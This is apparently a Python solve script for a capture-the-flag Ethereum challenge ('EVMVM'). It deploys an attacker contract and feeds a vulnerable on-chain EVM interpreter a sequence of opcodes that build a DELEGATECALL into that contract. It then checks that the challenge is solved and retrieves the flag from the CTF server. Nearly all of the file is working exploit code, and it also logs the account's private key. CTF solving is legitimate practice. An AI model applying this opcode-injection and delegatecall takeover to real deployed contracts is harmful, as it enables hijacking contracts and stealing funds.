from solcx import compile_files, install_solc_pragma
from web3 import Web3
from pwn import log, remote
install_solc_pragma('pragma solidity ^0.8.18;')
log.setLevel('debug')

opcodes = {"ADD": 1, "MUL": 0x02, "SUB": 0x03, "DIV": 0x04, "SDIV": 0x05, "MOD": 0x06, "SMOD": 0x07, "ADDMOD": 0x08, "MULMOD": 0x09, "EXP": 0x0A, "SIGNEXTEND": 0x0B, "LT": 0x10, "GT": 0x11, "SLT": 0x12, "SGT": 0x13, "EQ": 0x14, "ISZERO": 0x15, "AND": 0x16, "OR": 0x17, "XOR": 0x18, "NOT": 0x19, "BYTE": 0x1A, "SHL": 0x1B, "SHR": 0x1C, "SAR": 0x1D, "SHA3": 0x20, "ADDRESS": 0x30, "BALANCE": 0x31, "ORIGIN": 0x32, "CALLER": 0x33, "CALLVALUE": 0x34, "CALLDATALOAD": 0x35, "CALLDATASIZE": 0x36, "CALLDATACOPY": 0x37, "CODESIZE": 0x38, "GASPRICE": 0x3A, "EXTCODESIZE": 0x3B, "EXTCODECOPY": 0x3C, "RETURNDATASIZE": 0x3D, "RETURNDATACOPY": 0x3E, "EXTCODEHASH": 0x3F, "BLOCKHASH": 0x40, "TIMESTAMP": 0x42, "NUMBER": 0x43, "PREVRANDAO": 0x44, "GASLIMIT": 0x45, "CHAINID": 0x46, "SELBALANCE": 0x47, "BASEFEE": 0x48, "POP": 0x50, "MLOAD": 0x51, "MSTORE": 0x52, "MSTORE8": 0x53, "SLOAD": 0x54, "SSTORE": 0x55, "MSIZE": 0x59, "GAS": 0x5A, "DUP1": 0x80, "SWAP1": 0x91, "CREATE": 0xF0, "CALL": 0xF1, "CALLCODE": 0xF2, "RETURN": 0xF3, "DELEGATECALL": 0xF4, "CREATE2": 0xF5, "STATICCALL": 0xFA, "REVERT": 0xFD, "INVALID": 0xFE, "SELFDESTRUCT": 0xFF}

uuid = input().strip()
rpc = input().strip()
private_key = input().strip()
setupAddress = input().strip()
log.info(f"{uuid = }")
log.info(f"{rpc = }")
log.info(f"{private_key = }")
log.info(f"{setupAddress = }")
w3 = Web3(Web3.HTTPProvider(rpc))
account = w3.eth.account.from_key(private_key)
my_address = account.address
chainID = w3.eth.chainId
gasPrice = w3.eth.gas_price

log.info(f"My address: {my_address}")
# log.info(f"My balance: {w3.eth.get_balance(my_address)}")


def deploy(compiledContract, *argv):
    Bytecode = w3.eth.contract(
        abi=compiledContract['abi'], 
        bytecode=compiledContract['bin']
    )
    tx_hash = Bytecode.constructor(*argv).transact({
        "chainId": chainID,
        "gasPrice": gasPrice,
        "from": my_address,
    })
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    remoteContract = w3.eth.contract(
        abi=compiledContract['abi'], 
        address=tx_receipt.contractAddress
    )
    log.success(f"Successfully deploying a contract at {tx_receipt.contractAddress}")
    return remoteContract, tx_receipt.contractAddress


def view_stack(_address):
    stack_size = int.from_bytes(w3.eth.get_storage_at(_address, 0), 'big')
    log.debug(f"stack size: {stack_size}")
    for i in range(stack_size):
        res = w3.eth.get_storage_at(
            _address, 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 + i).hex()
        log.debug(f"{hex(i)} : {res}")


def init(x): return '0x' + int.to_bytes(x, 32, 'big').hex()


def query(opcode, arg, value=0):
    # print('a.enterTheMetametaverse(' + init(opcodes[opcode]) + ', ' + arg + ');')
    result = EVMVM.functions.enterTheMetametaverse(init(opcodes[opcode]), arg).transact({
        "chainId": chainID,
        "gasPrice": gasPrice,
        "from": my_address,
        "value": value
    })
    w3.eth.wait_for_transaction_receipt(result)
    
# compile sol
compiled_sol = compile_files(
    ['Setup.sol', 'EVMVM.sol', 'Solve.sol'],
    output_values=['abi', 'bin'],
    solc_version="0.8.17"
)
SetupContract = compiled_sol['Setup.sol:Setup']
EVMVMContract = compiled_sol['EVMVM.sol:EVMVM']
SolveContract = compiled_sol['Solve.sol:Exploit']
# remote contract
Solve, SolveAddress = deploy(SolveContract, setupAddress)
Setup = w3.eth.contract(address=setupAddress, abi=SetupContract['abi'])
EVMVMAddress = Setup.functions.metametaverse().call()
EVMVM = w3.eth.contract(address=EVMVMAddress, abi=EVMVMContract['abi'])

# assert the first element on stack will be zero
query('CALLVALUE', init(0))  # init
# Push 36 to stack
with log.progress("Pushing 36 to stack"):
    query('ISZERO', init(0))  # 1
    query('DUP1', init(0))  # 1 1
    query('SHL', init(0))  # 2
    query('DUP1', init(0))  # 2 2
    query('CALLDATASIZE', init(0))  # 68 2 2
    query('SWAP1', init(0))  # 2 68 2
    query('DIV', init(0))  # 34 2
    query('ADD', init(0))  # 36

view_stack(EVMVMAddress)
# Push delegatecall params to stack
with log.progress("Pushing delegatecall's params to stack"):
    query('DUP1', init(0)) # 36 36
    query('CALLDATALOAD', init(100000)) # gas 36 
    query('SWAP1', init(0))  # 36 gas
    query('CALLDATALOAD', '0x' + '00'*12 + SolveAddress[2:])
    query('CALLVALUE', init(0))  # 0 add gas
    query('CALLVALUE', init(0))  # 0 0 add gas
    query('CALLVALUE', init(0))  # 0 0 0 add gas
    query('CALLVALUE', init(0))  # 0 0 0 0 add gas
view_stack(EVMVMAddress)

query('DELEGATECALL', init(0))
assert Setup.functions.isSolved().call() == True
log.success('Successfully exploiting!')


# Get flag and close instance
io = remote("lac.tf", 31151, level='error')
io.sendlineafter(b'action? ', b'3')
io.sendlineafter(b': ', uuid.encode())
log.success(io.recvline(0).decode())
io.close()
io = remote("lac.tf", 31151, level='error')
io.sendlineafter(b'action? ', b'2')
io.sendlineafter(b': ', uuid.encode())
io.close()